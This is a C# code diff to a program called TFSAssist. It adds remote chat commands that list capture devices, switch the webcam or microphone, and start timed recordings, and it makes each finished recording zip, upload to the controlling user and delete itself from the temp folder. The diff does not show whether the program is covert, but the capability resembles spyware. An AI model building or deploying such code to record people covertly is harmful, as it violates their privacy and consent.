@@ -35,6 +35,8 @@ namespace TFSAssist
         private TTLControl _control;
         private readonly StringBuilder _processingErrorLogs;
 
+        private AForgeMediaDevices _aforgeDevices = null;
+        private EncoderMediaDevices _encDevices = null;
         private AForgeCapture _aforgeCapture;
         private EncoderCapture _encoderCapture;
 
@@ -274,38 +276,106 @@ namespace TFSAssist
                                 break;
 
                             case "caminfo":
-                                if (_camCapture == null)
+                                string resultCamInfo = string.Empty;
+                                if (_aforgeDevices != null)
                                 {
-                                    await SendMessageToCurrentUser($"Cam not initialized.");
-                                    break;
+                                    resultCamInfo = _aforgeDevices.ToString();
                                 }
 
-                                await SendMessageToCurrentUser($"Cam settings: TimeRec=[60] Video=[{string.Join("];[", _camCapture.VideoEncoders)}] Audio=[{string.Join("];[", _camCapture.AudioEncoders)}]");
+                                if (_encDevices != null)
+                                {
+                                    resultCamInfo = resultCamInfo + "\r\n" + _encDevices.ToString();
+                                }
+
+                                resultCamInfo = resultCamInfo.Trim();
+
+                                if (resultCamInfo.IsNullOrEmptyTrim())
+                                    await SendMessageToCurrentUser("No devices initialized.");
+                                else
+                                    await SendMessageToCurrentUser(resultCamInfo);
                                 break;
 
-                            case "cam":
-                                if (_camCapture == null)
+                            case "camsett":
+                                int exceptionCount = 0;
+                                if (options != null && options.Count > 0)
                                 {
-                                    await SendMessageToCurrentUser($"Cam not initialized.");
+                                    if (options.TryGetValue("Seconds", out var timeRecStr))
+                                    {
+                                        if (int.TryParse(timeRecStr, out var timeRec))
+                                        {
+                                            if (_aforgeCapture != null)
+                                                _aforgeCapture.SecondsRecordDuration = timeRec;
+                                            if (_encoderCapture != null)
+                                                _encoderCapture.SecondsRecordDuration = timeRec;
+                                        }
+                                    }
+
+                                    if (options.TryGetValue("Video", out var video))
+                                    {
+                                        try
+                                        {
+                                            _aforgeCapture?.ChangeVideoDevice(video);
+                                        }
+                                        catch (Exception ex)
+                                        {
+                                            exceptionCount++;
+                                            WriteExLog($"AForgeException: {ex.Message}");
+                                        }
+
+                                        try
+                                        {
+                                            _encoderCapture?.ChangeVideoDevice(video);
+                                        }
+                                        catch (Exception ex)
+                                        {
+                                            exceptionCount++;
+                                            WriteExLog($"EncoderException: {ex.Message}");
+                                        }
+                                    }
+
+                                    if (options.TryGetValue("Audio", out var audio))
+                                    {
+                                        try
+                                        {
+                                            _encoderCapture?.ChangeAudioDevice(audio);
+                                        }
+                                        catch (Exception ex)
+                                        {
+                                            exceptionCount++;
+                                            WriteExLog($"EncoderException: {ex.Message}");
+                                        }
+                                    }
+
+                                    if(exceptionCount > 0)
+                                        await SendMessageToCurrentUser($"Errors=[{exceptionCount}]");
+                                    else
+                                        await SendMessageToCurrentUser($"SUCCESS");
+                                }
+
+                                break;
+
+                            case "acam":
+                                if (_aforgeCapture == null)
+                                {
+                                    await SendMessageToCurrentUser($"AForge not initialized.");
                                     break;
                                 }
 
-                                int timeRec = 60;
-                                string video = null;
-                                string audio = null;
-                                if (options != null && options.Count > 0)
+                                _aforgeCapture.StartCamRecording();
+                                await SendMessageToCurrentUser($"Started. Finished after {_aforgeCapture.SecondsRecordDuration} seconds.");
+
+                                break;
+
+                            case "ecam":
+                                if (_encoderCapture == null)
                                 {
-                                    if (options.TryGetValue("TimeRec", out var timeRecStr))
-                                        int.TryParse(timeRecStr, out timeRec);
-                                    options.TryGetValue("Video", out video);
-                                    options.TryGetValue("Audio", out audio);
+                                    await SendMessageToCurrentUser($"Encoder not initialized.");
+                                    break;
                                 }
 
-                                string videoPath = Path.Combine(TempDirectory, $"{STRING.RandomString(15)}.bam");
-                                if (!await _camCapture.StartRec(videoPath, timeRec, video, audio))
-                                {
-                                    await SendMessageToCurrentUser($"Can't init cam. Settings: Video=[{string.Join("];[", _camCapture.VideoEncoders)}] Audio=[{string.Join("];[", _camCapture.AudioEncoders)}]");
-                                }
+                                _encoderCapture.StartCamRecording();
+                                await SendMessageToCurrentUser($"Started. Finished after {_encoderCapture.SecondsRecordDuration} seconds.");
+
                                 break;
                         }
                     }
@@ -325,40 +395,45 @@ namespace TFSAssist
             }
             finally
             {
-                var tempFiles = Directory.EnumerateFiles(TempDirectory);
-                if (tempFiles.Any())
-                {
-                    try
-                    {
-                        string destinationZip = DoZipFile(TempDirectory);
-                        if (destinationZip != null && File.Exists(destinationZip))
-                        {
-                            await SendBigFileToCurrentUser(destinationZip);
-                        }
-                    }
-                    catch (Exception ex)
-                    {
-                        WriteExLog(ex);
-                    }
-
-                    try
-                    {
-                        foreach (var fileName in tempFiles)
-                        {
-                            var fileInfo = new FileInfo(fileName);
-                            fileInfo.Attributes = FileAttributes.Normal;
-                            fileInfo.Delete();
-                        }
-                    }
-                    catch (Exception ex)
-                    {
-                        WriteExLog(ex);
-                    }
-                }
+                await SendPreparedFiles();
 
                 if (isUpdate)
                 {
                     _checkUpdates?.BeginInvoke(null, null);
+                }
+            }
+        }
+
+        async Task SendPreparedFiles()
+        {
+            var tempFiles = Directory.EnumerateFiles(TempDirectory);
+            if (tempFiles.Any())
+            {
+                try
+                {
+                    string destinationZip = DoZipFile(TempDirectory);
+                    if (destinationZip != null && File.Exists(destinationZip))
+                    {
+                        await SendBigFileToCurrentUser(destinationZip);
+                    }
+                }
+                catch (Exception ex)
+                {
+                    WriteExLog(ex);
+                }
+
+                try
+                {
+                    foreach (var fileName in tempFiles)
+                    {
+                        var fileInfo = new FileInfo(fileName);
+                        fileInfo.Attributes = FileAttributes.Normal;
+                        fileInfo.Delete();
+                    }
+                }
+                catch (Exception ex)
+                {
+                    WriteExLog(ex);
                 }
             }
         }
@@ -588,11 +663,9 @@ namespace TFSAssist
 
         void InitCamCapture()
         {
-            AForgeMediaDevices aforgeDevices = null;
-            EncoderMediaDevices encDevices = null;
             try
             {
-                aforgeDevices = new AForgeMediaDevices();
+                _aforgeDevices = new AForgeMediaDevices();
             }
             catch (Exception ex)
             {
@@ -601,7 +674,7 @@ namespace TFSAssist
 
             try
             {
-                encDevices = new EncoderMediaDevices();
+                _encDevices = new EncoderMediaDevices();
             }
             catch (Exception ex)
             {
@@ -610,7 +683,9 @@ namespace TFSAssist
 
             try
             {
-                _aforgeCapture = new AForgeCapture(aforgeDevices, encDevices, TempDirectory, 60);
+                _aforgeCapture = new AForgeCapture(_aforgeDevices, _encDevices, TempDirectory, 60);
+                _aforgeCapture.OnRecordingCompleted += OnRecordingCompleted;
+                _aforgeCapture.OnUnexpectedError += OnUnexpectedError;
             }
             catch (Exception ex)
             {
@@ -619,12 +694,23 @@ namespace TFSAssist
 
             try
             {
-                _encoderCapture = new EncoderCapture(aforgeDevices, encDevices, TempDirectory, 60);
+                _encoderCapture = new EncoderCapture(_aforgeDevices, _encDevices, TempDirectory, 60);
+                _encoderCapture.OnRecordingCompleted += OnRecordingCompleted;
             }
             catch (Exception ex)
             {
                 WriteExLog(ex);
             }
+        }
+
+        private void OnUnexpectedError(object sender, MediaCaptureEventArgs args)
+        {
+            WriteExLog($"AForge Unexpected Error=[{args?.Error?.ToString()}]");
+        }
+
+        private async void OnRecordingCompleted(object sender, MediaCaptureEventArgs args)
+        {
+            await SendPreparedFiles();
         }
 
         #region LOGS
@@ -633,7 +719,7 @@ namespace TFSAssist
 
         void WriteExLog(Exception ex, bool isDebug = true)
         {
-            WriteExLog(ex.ToString(), isDebug);
+            WriteExLog(ex?.ToString(), isDebug);
         }
 
         void WriteExLog(string message, bool isDebug = true)
